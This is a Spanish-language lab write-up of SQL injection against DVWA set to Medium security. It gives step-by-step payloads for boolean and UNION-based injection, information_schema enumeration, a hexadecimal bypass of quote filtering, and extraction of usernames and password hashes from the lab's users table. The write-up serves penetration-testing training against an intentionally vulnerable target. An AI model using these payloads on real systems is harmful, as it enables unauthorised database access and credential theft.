# DVWA SQL Injection — Medium Level Lab

## Overview

Este laboratorio documenta la explotación de una vulnerabilidad **SQL Injection (SQLi)** sobre **DVWA (Damn Vulnerable Web Application)** configurado en nivel **Medium**.

El objetivo principal fue analizar las diferencias respecto al nivel **LOW**, identificar mecanismos defensivos introducidos por la aplicación y adaptar los payloads para mantener la capacidad de explotación.

Durante el assessment se realizaron técnicas de:

- Reconocimiento del parámetro vulnerable
- Boolean-Based SQL Injection
- UNION-Based SQL Injection
- Database Enumeration
- Schema Discovery
- Filter Bypass mediante hexadecimal encoding
- Credential Extraction

---

## Objetivos del laboratorio

- Comprender el comportamiento de SQLi en nivel Medium.
- Comparar mecanismos defensivos respecto a DVWA LOW.
- Validar explotación mediante payloads adaptados.
- Enumerar estructura interna de la base de datos.
- Extraer información sensible desde tablas vulnerables.
- Analizar oportunidades de detección y aprendizaje defensivo.

---

## Lab Setup

### Máquina atacante

```txt
Kali Linux
```

### Máquina objetivo

```txt
Metasploitable 2
```

### Aplicación vulnerable

```txt
DVWA (Damn Vulnerable Web Application)
```

### Configuración utilizada

```txt
DVWA Security Level → Medium
```

---

## Metodología

El laboratorio fue ejecutado siguiendo un flujo progresivo de explotación:

```txt
Recon
↓
Input Testing
↓
Boolean Validation
↓
UNION Validation
↓
Table Enumeration
↓
Column Enumeration
↓
Filter Bypass
↓
Credential Extraction
```

---

## Attack Flow

### 1. Reconocimiento inicial

Se identificó un parámetro vulnerable transmitido mediante método GET.

Ejemplo:

```txt
?id=1&Submit=Submit
```

---

### 2. Boolean-Based SQL Injection

Se validó comportamiento lógico utilizando condiciones booleanas.

Payload exitoso:

```sql
1 AND 1=1
```

Payload fallido:

```sql
1 AND 1=2
```

Hallazgo:

La aplicación continuaba evaluando lógica SQL pese al endurecimiento del nivel de seguridad.

---

### 3. UNION-Based SQL Injection

Se verificó capacidad de UNION injection.

Payload utilizado:

```sql
1 UNION SELECT version(),database()
```

Resultado obtenido:

- Versión del motor MySQL
- Nombre de la base activa

---

### 4. Database Enumeration

Enumeración de tablas disponibles utilizando `information_schema`.

Payload:

```sql
1 UNION SELECT table_name,table_schema
FROM information_schema.tables
```

Se identificaron múltiples esquemas incluyendo:

- dvwa
- mysql
- tikiwiki
- owasp10

---

### 5. Column Discovery

Enumeración de columnas de la tabla `users`.

Payload adaptado:

```sql
1 UNION SELECT column_name,table_name
FROM information_schema.columns
WHERE table_name=0x7573657273
```

Columnas identificadas:

```txt
user_id
first_name
last_name
user
password
avatar
```

---

### 6. Filter Bypass — Hex Encoding

DVWA Medium introdujo restricciones sobre payloads clásicos basados en quotes.

Se implementó bypass utilizando representación hexadecimal.

Ejemplo:

Payload tradicional:

```sql
'users'
```

Payload adaptado:

```sql
0x7573657273
```

Esto permitió mantener capacidad de enumeración evitando filtros parciales.

---

### 7. Credential Extraction

Finalmente se realizó extracción controlada de credenciales.

Payload:

```sql
1 UNION SELECT user,password FROM users
```

Usuarios obtenidos:

```txt
admin
gordon
1337
pablo
smithy
```

Hashes recuperados:

```txt
5f4dcc3b5aa765d61d8327deb882cf99
e99a18c428cb38d5f260853678922e03
8d3533d75ae2c3966d7e0d4fcc69216b
0d107d09f5bbe40cade3de5c71e9e9b7
```

---

## Hallazgos Técnicos

| Finding | Resultado |
|----------|-----------|
| SQL Injection | Confirmada |
| Boolean SQLi | Exitosa |
| UNION SQLi | Exitosa |
| Enumeration | Exitosa |
| information_schema Abuse | Confirmado |
| Filter Bypass | Exitoso |
| Credential Disclosure | Confirmado |

---

## Conclusión

DVWA Medium demuestra cómo **defensas parciales no eliminan SQL Injection**, sino que obligan a adaptar los payloads.

Aunque los payloads clásicos basados en quotes dejaron de funcionar, la vulnerabilidad continuó siendo explotable mediante:

- Numeric Injection
- Boolean Logic
- UNION Queries
- Hexadecimal Encoding

El laboratorio permitió practicar técnicas de **adaptación ofensiva**, **schema discovery**, y **extracción controlada de datos sensibles**, acercando el ejercicio a escenarios reales de Application Security y Pentesting.
